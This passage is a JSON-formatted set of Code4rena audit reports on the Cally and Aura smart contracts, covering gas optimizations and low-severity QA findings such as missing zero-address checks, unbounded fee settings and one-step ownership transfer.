    "body": "## Usage of `storage` instead of `memory` can save gas\nWhen calling `Vault memory vault = _vaults[vaultId];` all the struct is read from storage to memory. If we are interested in only some values we can use `Vault storage vault = _vaults[vaultId];` which saves a reference to storage, meaning that SLOADs happen later only for the value we access.\n\nThese are all instances where it can save gas (see `@audit` comments for diff)\n### [getPremium](https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L395)\n```js\n    function getPremium(uint256 vaultId) public view returns (uint256 premium) {\n        Vault storage vault = _vaults[vaultId];  //@audit from memory to storage\n        return premiumOptions[vault.premiumIndex];\n    }\n```\n\n### [buyOption](https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L207-L253)\n\n```js\n    function buyOption(uint256 vaultId) external payable returns (uint256 optionId) {\n        Vault storage vault = _vaults[vaultId];  //@audit from memory to storage\n\n        // vaultId should always be odd\n        require(vaultId % 2 != 0, \"Not vault type\");\n\n        // check vault exists\n        require(ownerOf(vaultId) != address(0), \"Vault does not exist\");\n\n        // check that the vault still has the NFTs as collateral\n        require(vault.isExercised == false, \"Vault already exercised\");\n\n        // check that the vault is not in withdrawing state\n        require(vault.isWithdrawing == false, \"Vault is being withdrawn\");\n\n        // check enough eth was sent to cover premium\n        uint256 premium = getPremium(vaultId);\n        require(msg.value >= premium, \"Incorrect ETH amount sent\");\n\n        // check option associated with the vault has expired\n        uint32 auctionStartTimestamp = vault.currentExpiration;\n        require(block.timestamp >= auctionStartTimestamp, \"Auction not started\");\n\n        // set new currentStrike\n        //@audit also updates storage\n        vault.currentStrike = getDutchAuctionStrike(\n            strikeOptions[vault.dutchAuctionStartingStrikeIndex],\n            vault.currentExpiration + AUCTION_DURATION,\n            vault.dutchAuctionReserveStrike\n        );\n\n        // set new expiration\n        //@audit also updates storage\n        vault.currentExpiration = uint32(block.timestamp) + (vault.durationDays * 1 days);\n\n        //@audit no needed - already updated\n        // update the vault with the new option expiration and strike\n        //_vaults[vaultId] = vault;\n\n        // force transfer the vault's associated option from old owner to new owner\n        // option id for a respective vault is always vaultId + 1\n        optionId = vaultId + 1;\n        _forceTransfer(msg.sender, optionId);\n\n        // increment vault beneficiary's unclaimed premiums\n        address beneficiary = getVaultBeneficiary(vaultId);\n        ethBalance[beneficiary] += msg.value;\n\n        emit BoughtOption(optionId, msg.sender, vault.token);\n    }\n```\n\n### [exercise](https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L258-L297)\n```js\n    function exercise(uint256 optionId) external payable {\n        // optionId should always be even\n        require(optionId % 2 == 0, \"Not option type\");\n\n        // check owner\n        require(msg.sender == ownerOf(optionId), \"You are not the owner\");\n\n        uint256 vaultId = optionId - 1;\n        Vault storage vault = _vaults[vaultId];  //@audit from memory to storage\n\n        // check option hasn't expired\n        require(block.timestamp < vault.currentExpiration, \"Option has expired\");\n\n        // check correct ETH amount was sent to pay the strike\n        require(msg.value == vault.currentStrike, \"Incorrect ETH sent for strike\");\n\n        // burn the option token\n        _burn(optionId);\n\n        // mark the vault as exercised\n        vault.isExercised = true;\n        //_vaults[vaultId] = vault;  //@audit no needed - already updated\n\n        // collect protocol fee\n        uint256 fee = 0;\n        if (feeRate > 0) {\n            fee = (msg.value * feeRate) / 1e18;\n            protocolUnclaimedFees += fee;\n        }\n\n        // increment vault beneficiary's ETH balance\n        ethBalance[getVaultBeneficiary(vaultId)] += msg.value - fee;\n\n        emit ExercisedOption(optionId, msg.sender);\n\n        // transfer the NFTs or ERC20s to the exerciser\n        vault.tokenType == TokenType.ERC721\n            ? ERC721(vault.token).transferFrom(address(this), msg.sender, vault.tokenIdOrAmount)\n            : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);\n    }\n```\n\n### [withdraw](https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L325)\nL325\n```js\nVault storage vault = _vaults[vaultId];  //@audit from memory to storage\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-cally-findings",
      "repo": "https://github.com/code-423n4/2022-05-cally-findings",
      "url": "https://github.com/code-423n4/2022-05-cally-findings/issues/304"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Table of Contents\n\n- [summary](#summary)\n- [Events emitted early](#events-emitted-early)\n- [Event should be emitted in setters](#event-should-be-emitted-in-setters)\n- [Function missing comments](#function-missing-comments)\n- [Related data should be grouped in struct](#related-data-should-be-grouped-in-struct)\n- [nonReentrant modifier unused](#nonreentrant-modifier-unused)\n- [High feeRate can break core protocol function](#high-feerate-can-break-core-protocol-function)\n- [Unchecked inputs](#unchecked-inputs)\n\n\n\n# summary\n\n> Few vulnerabilities were found examining the contracts. The main concerns are with the lack of checks in setters.\n\n\n\n\n# Events emitted early\n\n## PROBLEM\n\nIt is not recommended to emit events before the end of the computations, as the function might revert based on conditions ahead of the event emission\n\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Cally.sol\n\n```\nCally.sol: 195 emit NewVault(vaultId, msg.sender, token);//emitted before tokens transferred to contract.\nCally.sol: 291 emit ExercisedOption(optionId, msg.sender);//emitted before tokens transferred to user.\nCally.sol: 337 emit Withdrawal(vaultId, msg.sender);//emitted before harvest() call and tokens transferred to user.\nCally.sol: 365 emit Harvested(msg.sender, amount);//emitted before ETH transferred to user.\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nPlace the event emission in the last position in the function.\n\n# Event should be emitted in setters\n\n## PROBLEM\n\nSetters should emit an event so that Dapps can detect important changes to storage\n\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Cally.sol\n\n```\nCally.sol:119: setFee(uint256 feeRate_)\nCally.sol:351: setVaultBeneficiary(uint256 vaultId, address beneficiary)\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nEmit an event in all setters.\n\n# Function missing comments\n\n## PROBLEM\n\nSome functions are missing comments.\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Cally.sol\n\n```\nCally.sol:455: function tokenURI(uint256 tokenId)\n```\n\n### CallyNft.sol\n\n```\nCallyNft.sol:51: function renderJSON()\nCallySvg.sol:136: function renderSvg()\nCallyNft.sol:236: function addressToString()\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd comments to these functions\n\n# Related data should be grouped in struct\n\n## PROBLEM\n\nWhen there are mappings that use the same key value, having separate fields is error prone, for instance in case of deletion or with future new fields.\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Cally.sol\n\n```\nCally.sol:103: mapping(uint256 => Vault) private _vaults;\nCally.sol:108: mapping(uint256 => address) private _vaultBeneficiaries;\n```\n\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nGroup the related data in a struct and use one mapping. For instance, for the `Cally.sol` mappings, the mitigation could be:\n\n```\nstruct VaultInformation {\n  Vault _vault;\n  address beneficiary;\n}\n```\n\nAnd it would be used as a state variable:\n\n```\nmapping(uint256 =>  VaultInformation) private vaultInformation;\n```\n\n\n\n\n\n# nonReentrant modifier unused \n\n## PROBLEM\n\nSome external functions calling the ERC20 methods `safeTransfer` or `safeTransferFrom` do not have the nonReentrant modifier and are hence unprotected to reentrancy (besides the gas limit on the methods). No funds are directly at loss but it is best practice to avoid reentrancy altogether.\n\n\n\n## SEVERITY\n\nLow\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Cally.sol\n\n```\nCally.sol:158: function createVault()\nCally.sol:258: function exercise()\nCally.sol:368: function harvest()\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nUse the `nonReentrant` modifier on these functions.\n\n\n\n\n# High `feeRate` can break core protocol function\n\n## PROBLEM\n\nThere is no maximum input value on `setFee()` in `Cally.sol`. But if the owner sets it to a uint greater than 1e18, the users will not be able to call `exercice()` as the function will revert, breaking the protocol's functionality.\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Cally.sol\n\n```\nCally.sol:284: fee = (msg.value * feeRate) / 1e18;\n```\n\nIf feeRate is set so that `ethBalance[getVaultBeneficiary(vaultId)]` + msg.value < fee, and the following statement will revert\n\n```\nCally.sol:289: ethBalance[getVaultBeneficiary(vaultId)] += msg.value - fee;\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd a check in `setFee` to ensure the new fee rate is less than a maximum `maxFeeRate`. Its value depends on different factors, but considering it determines how much ETH a vault creator is receiving from a strike, it should be reasonably low (ie less than 0.5 * 1e18) \n\n\n\n# Unchecked inputs\n\n## PROBLEM\n\nSetters should check the input value - ie make revert if it is the zero address. Here, if the vault beneficiary is set as the zero address, all the strike ETH associated with the vault will be locked.\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Cally.sol\n\n```\nCally.sol:351: setVaultBeneficiary()\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd a zero address check\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-cally-findings",
      "repo": "https://github.com/code-423n4/2022-05-cally-findings",
      "url": "https://github.com/code-423n4/2022-05-cally-findings/issues/268"
    }
  },
  {
    "title": "QA Report",
    "body": "\n## Mult instead div in compares\n\n\nTo improve algorithm precision instead using division in comparison use multiplication in the following scenario:\n        \n        Instead a < b / c use a * c < b. \n    \nIn all of the big and trusted contracts this rule is maintained.\n    \n### Code instances:\n\n        CallyNft.sol, 151, svg.text( string.concat( svg.prop(\"x\", \"10\"), svg.prop(\"y\", \"20\"), svg.prop(\"font-size\", \"12\"), svg.prop(\"fill\", \"white\") ), string.concat(svg.cdata(\"Token: \"), token) ), svg.text( string.concat( svg.prop(\"x\", \"10\"), svg.prop(\"y\", \"40\"), svg.prop(\"font-size\", \"12\"), svg.prop(\"fill\", \"white\") ), string.concat(svg.cdata(\"Token ID or Amount: \"), tokenIdOrAmount) ), svg.text( string.concat( svg.prop(\"x\", \"10\"), svg.prop(\"y\", \"60\"), svg.prop(\"font-size\", \"12\"), svg.prop(\"fill\", \"white\") ), string.concat(svg.cdata(\"Premium (WEI): \"), premium) ), svg.text( string.concat( svg.prop(\"x\", \"10\"), svg.prop(\"y\", \"80\"), svg.prop(\"font-size\", \"12\"), svg.prop(\"fill\", \"white\") ), string.concat(svg.cdata(\"Duration (days): \"), durationDays) ), svg.text( string.concat( svg.prop(\"x\", \"10\"), svg.prop(\"y\", \"100\"), svg.prop(\"font-size\", \"12\"), svg.prop(\"fill\", \"white\") ), string.concat(svg.cdata(\"Starting strike (WEI): \"), dutchAuctionStartingStrike) ), svg.text( string.concat( svg.prop(\"x\", \"10\"), svg.prop(\"y\", \"120\"), svg.prop(\"font-size\", \"12\"), svg.prop(\"fill\", \"white\") ), string.concat(svg.cdata(\"Expiration (UNIX): \"), currentExpiration) ), svg.text( string.concat( svg.prop(\"x\", \"10\"), svg.prop(\"y\", \"140\"), svg.prop(\"font-size\", \"12\"), svg.prop(\"fill\", \"white\") ), string.concat(svg.cdata(\"Strike (WEI): \"), currentStrike) ), svg.text( string.concat( svg.prop(\"x\", \"10\"), svg.prop(\"y\", \"160\"), svg.prop(\"font-size\", \"12\"), svg.prop(\"fill\", \"white\") ), string.concat(svg.cdata(\"Exercised (y/n): \"), isExercised) ), svg.text( string.concat( svg.prop(\"x\", \"10\"), svg.prop(\"y\", \"180\"), svg.prop(\"font-size\", \"12\"), svg.prop(\"fill\", \"white\") ), string.concat(svg.cdata(\"Type: \"), nftType) ), \"</svg>\" );\n        Renderer.sol, 12, svg.text( string.concat( svg.prop('x', '20'), svg.prop('y', '40'), svg.prop('font-size', '22'), svg.prop('fill', 'white') ), string.concat( svg.cdata('Hello, token #'), utils.uint2str(_tokenId) ) ), svg.rect( string.concat( svg.prop('fill', 'purple'), svg.prop('x', '20'), svg.prop('y', '50'), svg.prop('width', utils.uint2str(160)), svg.prop('height', utils.uint2str(10)) ), utils.NULL ), '</svg>' );\n        SVG.sol, 152, string.concat( '<', _tag, ' ', _props, '>', _children, '</', _tag, '>' );\n        SVG.sol, 171, string.concat( '<', _tag, ' ', _props, '/>' );\n\n\n\n## Does not validate the input fee parameter\n\n\nSome fee parameters of functions are not checked for invalid values. Validate the parameters:\n        \n        \n### Code instance:\n\n        Cally.setFee (feeRate_)\n\n\n\n## Require with empty message\n\nThe following requires are with empty messages. \nThis is very important to add a message for any require. So the user has enough information to know the reason of failure.\n### Code instances:\n\n        Solidity file: SafeCastLib.sol, In line 39 with Empty Require message.\n        Solidity file: SafeCastLib.sol, In line 51 with Empty Require message.\n        Solidity file: SafeCastLib.sol, In line 21 with Empty Require message.\n        Solidity file: SafeCastLib.sol, In line 9 with Empty Require message.\n        Solidity file: SafeCastLib.sol, In line 33 with Empty Require message.\n\n\n\n## Require with not comprehensive message\n\nThe following requires has a non comprehensive messages. \nThis is very important to add a comprehensive message for any require. Such that the user has enough \ninformation to know the reason of failure: \n\n### Code instances:\n\n        Solidity file: Test.sol, In line 257 with Require message: NotFound\n        Solidity file: Cally.sol, In line 354 with Require message: Not owner\n\n\n\n## Not verified input\n\n\nexternal / public functions parameters should be validated to make sure the address is not 0.\nOtherwise if not given the right input it can mistakenly lead to loss of user funds.    \n\n### Code instances:\n\n        ERC20.sol.permit spender\n        ERC20.sol.transferFrom to\n        ERC4626.sol.deposit receiver\n        ERC20.sol.approve spender\n        Cally.sol.transferFrom to\n\n\n\n## Solidity compiler versions mismatch\n\n\nThe project is compiled with different versions of solidity, which is not recommended because it can lead to undefined behaviors.\n        \n### Code instance:\n\n        \n\n\n\n## Use safe math for solidity version <8\n\nYou should use safe math for solidity version <8 since there is no default over/under flow check it suchversions of solidity.\n### Code instances:\n\n        The contract Test.sol doesn't use safe math and is of solidity version < 8\n        The contract base64.sol doesn't use safe math and is of solidity version < 8\n        The contract console.sol doesn't use safe math and is of solidity version < 8\n        The contract Vm.sol doesn't use safe math and is of solidity version < 8\n\n\n\n## Not verified owner\n\n\n        owner param should be validated to make sure the owner address is not address(0).\n        Otherwise if not given the right input all only owner accessible functions will be unaccessible.\n        \n        \n### Code instances:\n\n        ERC20.sol.permit owner\n        ERC4626.sol.redeem owner\n        ERC4626.sol.withdraw owner\n\n\n\n## Named return issue\n\nUsers can mistakenly think that the return value is the named return, but it is actually the actualreturn statement that comes after. To know that the user needs to read the code and is confusing.\nFurthermore, removing either the actual return or the named return will save gas. \n\n### Code instances:\n\n        FixedPointMathLib.sol, mulDivUp\n        Cally.sol, getVaultBeneficiary\n        Cally.sol, getPremium\n        Utils.sol, uint2str\n\n\n\n## Missing non reentrancy modifier\n\nThe following functions are missing reentrancy modifier although some other pulbic/external functions does use reentrancy modifer.\nEven though I did not find a way to exploit it, it seems like those functions should have the nonReentrant modifier as the other functions have it as well..\n\n### Code instances:\n\n        Cally.sol, createVault is missing a reentrancy modifier\n        Cally.sol, transferFrom is missing a reentrancy modifier\n        Cally.sol, buyOption is missing a reentrancy modifier\n        Cally.sol, exercise is missing a reentrancy modifier\n\n\n\n## Never used parameters\n\nThose are functions and parameters pairs that the function doesn't use the parameter. In case those functions are external/public this is even worst since the user is required to put value that never used and can misslead him and waste its time. \n\n### Code instances:\n\n        CREATE3.sol: function deploy parameter creationCode isn't used. (deploy is internal)\n        ERC4626.sol: function beforeWithdraw parameter shares isn't used. (beforeWithdraw is internal)\n        ERC4626.sol: function afterDeposit parameter assets isn't used. (afterDeposit is internal)\n        ERC4626.sol: function beforeWithdraw parameter assets isn't used. (beforeWithdraw is internal)\n        CREATE3.sol: function deploy parameter value isn't used. (deploy is internal)\n\n\n\n## Missing commenting\n\n\n        The following functions are missing commenting as describe below:\n        \n### Code instances:\n\n        Cally.sol, tokenURI (public), parameter tokenId not commented\n        Cally.sol, transferFrom (public), parameters from, to, id not commented\n        Cally.sol, vaults (external), @return is missing\n        Cally.sol, tokenURI (public), @return is missing\n\n\n\n## Check transfer receiver is not 0 to avoid burned money\n\n\nTransferring tokens to the zero address is usually prohibited to accidentally avoid \"burning\" tokens by sending them to an unrecoverable zero address.\n\n\n### Code instances:\n\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/src/Cally.sol#L243\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/lib/solmate/src/mixins/ERC4626.sol#L63\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/lib/solmate/src/mixins/ERC4626.sol#L50\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/lib/solmate/src/tokens/ERC20.sol#L85\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/lib/solmate/src/mixins/ERC4626.sol#L92\n\n\n\n## Never used parameters\n\nThose are functions and parameters pairs that the function doesn't use the parameter. In case those functions are external/public this is even worst since the user is required to put value that never used and can misslead him and waste its time. \n\n### Code instances:\n\n        CREATE3.sol: function deploy parameter creationCode isn't used. (deploy is internal)\n        ERC4626.sol: function beforeWithdraw parameter shares isn't used. (beforeWithdraw is internal)\n        ERC4626.sol: function afterDeposit parameter assets isn't used. (afterDeposit is internal)\n        ERC4626.sol: function beforeWithdraw parameter assets isn't used. (beforeWithdraw is internal)\n        CREATE3.sol: function deploy parameter value isn't used. (deploy is internal)\n\n\n\n## Missing commenting\n\n\n        The following functions are missing commenting as describe below:\n        \n### Code instances:\n\n        Cally.sol, tokenURI (public), parameter tokenId not commented\n        Cally.sol, transferFrom (public), parameters from, to, id not commented\n        Cally.sol, vaults (external), @return is missing\n        Cally.sol, tokenURI (public), @return is missing\n\n\n\n## Add a timelock\n\nTo give more trust to users: functions that set key/critical variables should be put behind a timelock.\n\n### Code instances:\n\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/lib/solmate/src/auth/authorities/RolesAuthority.sol#L95\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/lib/solmate/src/auth/authorities/MultiRolesAuthority.sol#L92\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/src/Cally.sol#L351\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/lib/solmate/src/auth/authorities/MultiRolesAuthority.sol#L82\n        https://github.com/code-423n4/2022-05-cally/tree/main/contracts/lib/solmate/src/auth/authorities/MultiRolesAuthority.sol#L110\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-cally-findings",
      "repo": "https://github.com/code-423n4/2022-05-cally-findings",
      "url": "https://github.com/code-423n4/2022-05-cally-findings/issues/266"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n\n## Table of Contents\n\n- [Check non zero values can avoid external call](#check-non-zero-values-can-avoid-external-call)\n- [Comparisons with zero for unsigned integers](#comparisons-with-zero-for-unsigned-integers)\n- [Comparison operators](#comparison-operators)\n- [Custom errors](#custom-errors)\n- [Default value initialization](#default-value-initialization)\n- [Prefix increments](#prefix-increments)\n- [unchecked arithmetic](#unchecked-arithmetic)\n- [unnecessary computation](#unnecessary-computation)\n\n# Check non zero values can avoid external call\n\n## IMPACT\n\nwhen calling ERC20 transfer functions, it is good to check the amount is non-zero, to avoid an unnecessary function call\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### Cally.sol\n\n```\nCally.sol:158: function createVault(\n        uint256 tokenIdOrAmount) //if it is an ERC20 token, it does not make sense to create a vault for 0 tokens.\nCally.sol:200 : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount);\nCally.sol:296 : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\ncheck that `tokenIdOrAmount != 0` before these calls. For `createVault()` add it only in the case of an ERC20 (some ERC721 may have a token with an id of 0.)\n\n# Comparisons with zero for unsigned integers\n\n## IMPACT\n\n`>0` is less gas efficient than `!0` if you enable the optimizer at 10k AND you’re in a require statement.\nDetailed explanation with the opcodes [here](https://twitter.com/gzeon/status/1485428085885640706)\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### Cally.sol\n\n```\nCally.sol:170\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nReplace `> 0` with `!0`\n\n# Comparison Operators\n\n## IMPACT\n\nIn the EVM, there is no opcode for ` >=` or `<=`.\nWhen using greater than or equal, two operations are performed: `>` and `=`.\n\nUsing strict comparison operators hence saves gas\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### Cally.sol\n\n```\nCally.sol:224: require(msg.value >= premium, \"Incorrect ETH amount sent\");\nCally.sol:228: require(block.timestamp >= auctionStartTimestamp, \"Auction not started\");\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nReplace `<=` with `<`, and `>=` with `>`. Do not forget to increment/decrement the compared variable\n\nexample:\n\n```\n-block.timestamp >= auctionStartTimestamp\n+block.timestamp > auctionStartTimestamp - 1\n```\n\nHowever, if `1` is negligible compared to the value of the variable, we can omit the increment.\n\nexample:\n\n```\n-block.timestamp >= auctionStartTimestamp\n+block.timestamp > auctionStartTimestamp\n```\n\n\n# Custom Errors\n\n## IMPACT\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information, as explained [here](https://blog.soliditylang.org/2021/04/21/custom-errors/)\n\nCustom errors are defined using the error statement\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### Cally.sol\n\n```\nCally.sol:167\nCally.sol:168\nCally.sol:169\nCally.sol:170\nCally.sol:171\nCally.sol:211\nCally.sol:214\nCally.sol:217\nCally.sol:220\nCally.sol:224\nCally.sol:228\nCally.sol:260\nCally.sol:263\nCally.sol:269\nCally.sol:272\nCally.sol:304\nCally.sol:307\nCally.sol:320\nCally.sol:323\nCally.sol:328\nCally.sol:329\nCally.sol:330\nCally.sol:353\nCally.sol:354\nCally.sol:436\nCally.sol:437\nCally.sol:438\nCally.sol:456\n```\n\n### CallyNFT.sol \n\n```\nCallyNFT.sol:15\nCallyNFT.sol:16\nCallyNFT.sol:36\nCallyNFT.sol:42\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nReplace require and revert statements with custom errors.\n\nFor instance, in `Cally.sol`:\n\nReplace\n\n```\nrequire(_ownerOf[tokenId] != address(0), \"URI query for NOT_MINTED token\");\n```\n\nwith\n\n```\nif (_ownerOf[tokenId] == address(0)) {\n\t\trevert IsNotMinted(tokenId);\n}\n```\n\nand define the custom error in the contract\n\n```\nerror IsNotMinted(uint256 _tokenId_);\n```\n\n# Default value initialization\n\n## IMPACT\n\nIf a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type).\nExplicitly initializing it with its default value is an anti-pattern and wastes gas.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### Cally.sol\n\n```\nCally.sol:94: uint256 public feeRate = 0;\nCally.sol:95: uint256 public protocolUnclaimedFees = 0;\nCally.sol:282: uint256 fee = 0;\n```\n\n### CallyNft.sol\n\n```\nCallyNft.sol:244: uint256 i = 0;\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nRemove explicit initialization for default values.\n\n\n# Prefix increments\n\n## IMPACT\n\nPrefix increments are cheaper than postfix increments.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### CallyNft.sol\n\n```\nCallyNft.sol:244: i++\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nchange `i++` to `++i`.\n\n\n\n\n# Unchecked arithmetic\n\n## IMPACT\n\nThe default \"checked\" behavior costs more gas when adding/diving/multiplying, because under-the-hood those checks are implemented as a series of opcodes that, prior to performing the actual arithmetic, check for under/overflow and revert if it is detected.\n\nif it can statically be determined there is no possible way for your arithmetic to under/overflow (such as a condition in an if statement), surrounding the arithmetic in an `unchecked` block will save gas\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### CallyNft.sol\n\n```\nCallyNft.sol:244: i bounded by data.length, which is bounded as data.length = 20, overflow check unnecessary\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nPlace the arithmetic operations in an `unchecked` block\n\n\n# Unnecessary computation\n\n## IMPACT\n\nIf a value is known, it is more efficient to hardcode it than read it from memory\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### CallyNft.sol\n\n```\nCallyNft.sol:241\nCallyNft.sol:244\naccount is an address, so data.length == 20\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nReplace\n\n```\ndata.length\n```\n\nwith\n\n```\n20\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-05-cally-findings",
      "repo": "https://github.com/code-423n4/2022-05-cally-findings",
      "url": "https://github.com/code-423n4/2022-05-cally-findings/issues/265"
    }
  },
  {
    "title": "QA Report",
    "body": "\n### 1. Can create stash with an empty gauge (low)\n\nCreateStash can create a misconfigured stashes that have zero gauge as a result of operational mistake. This is possible as calls with zero gauge will pass, isV* calls will all return true, i.e. it's possible to create stash of any type with zero gauge.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/StashFactoryV2.sol#L53-L55\n\n```solidity\n    //Create a stash contract for the given gauge.\n    //function calls are different depending on the version of curve gauges so determine which stash type is needed\n    function CreateStash(uint256 _pid, address _gauge, address _staker, uint256 _stashVersion) external returns(address){\n```\n\nx0.call will return true:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/StashFactoryV2.sol#L87-L103\n\n```solidity\n    function IsV1(address _gauge) private returns(bool){\n        bytes memory data = abi.encode(rewarded_token);\n        (bool success,) = _gauge.call(data);\n        return success;\n    }\n\n    function IsV2(address _gauge) private returns(bool){\n        bytes memory data = abi.encodeWithSelector(reward_tokens,uint256(0));\n        (bool success,) = _gauge.call(data);\n        return success;\n    }\n\n    function IsV3(address _gauge) private returns(bool){\n        bytes memory data = abi.encodeWithSelector(rewards_receiver,address(0));\n        (bool success,) = _gauge.call(data);\n        return success;\n    }\n```\n\n## Recommended Mitigation Steps\n\nConsider checking _gauge and _staker addresses to be non-zero.\n\n\n### 2. Comment is misleading (low)\n\nIf it describes the `_checkDelay == 0 && _relock` case, it should be `now + (1)`\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L386-L389\n\n```solidity\n        // e.g. now = 16\n        // if contract is shutdown OR latest lock unlock time (e.g. 17) <= now - (1)\n        // e.g. 17 <= (16 + 1)\n        if (isShutdown || locks[length - 1].unlockTime <= expiryTime) {\n```\n\n## Recommended Mitigation Steps\n\nConsider expanding the comment to cover the both cases, processExpiredLocks and kickExpiredLocks:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L382-L384\n\n```solidity\n        uint256 expiryTime = _checkDelay == 0 && _relock\n            ? block.timestamp.add(rewardsDuration)\n            : block.timestamp.sub(_checkDelay);\n```\n\n### 3. Comments misspelling (non-critical)\n\nseparate in both cases:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/Booster.sol#L411\n\n```solidity\n//some gauges claim rewards when depositing, stash them in a seperate contract until next claim\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/BaseRewardPool.sol#L57\n\n```solidity\n *          distribute a child reward token (i.e. a secondary one from Curve, or a seperate one).\n```\n\nResponsible in both cases:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/Booster.sol#L569\n\n```solidity\n*         Repsonsible for collecting the crv from gauge, and then redistributing to the correct place.\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/Booster.sol#L631\n\n```solidity\n*         Repsonsible for collecting the crv from gauge, and then redistributing to the correct place.\n```\n\nArray:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraVestedEscrow.sol#L94\n\n```solidity\n* @param _amount     Arrary of amount of rewardTokens to vest\n```\n\n\n### 4. Ownership is transferred with one step procedure in multiple cases (non-critical)\n\nOne step process offers no protection for the cases when ownership transfer is performed mistakenly or with any malicious intent.\n\nAdding a modest complexity of an additional step and a delay is a low price to pay for having time to evaluate the ownership change.\n\n## Proof of Concept\n\nBooster.owner:\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/Booster.sol#L128-L133\n\n```solidity\n    function setOwner(address _owner) external {\n        require(msg.sender == owner, \"!auth\");\n        owner = _owner;\n\n        emit OwnerUpdated(_owner);\n    }\n```\n\nhttps://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/BoosterOwner.sol#L107-L113\n\n```solidity\n    function setBoosterOwner() external onlyOwner{\n        //allow reverting ownership until sealed\n        require(!isSealed, \"ownership sealed\");\n\n        //transfer booster ownership to this owner\n        IOwner(booster).setOwner(owner);\n    